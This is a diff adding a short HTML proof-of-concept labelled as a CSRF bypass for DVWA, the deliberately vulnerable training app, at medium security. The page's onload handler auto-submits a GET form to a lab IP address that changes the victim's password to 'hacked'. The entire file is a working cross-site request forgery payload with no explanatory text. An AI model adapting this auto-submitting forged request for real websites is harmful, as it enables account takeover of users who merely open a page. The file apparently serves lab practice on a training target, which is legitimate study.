@@ -1,0 +1,11 @@
+<!-- DVWA CSRF Bypass (Medium level security)-->
+<html>
+	<body onload=document.getElementById('csrf').submit()>
+		<form id="csrf" method="GET" action="http://192.168.56.102/dvwa/vulnerabilities/csrf/">
+			<input type="password" name="password_current" value="password">
+			<input type="password" name="password_new" value="hacked">
+			<input type="password" name="password_conf" value="hacked">
+			<input type="text" value="Change" name="Change">		
+		</form>	
+	</body>
+</html>
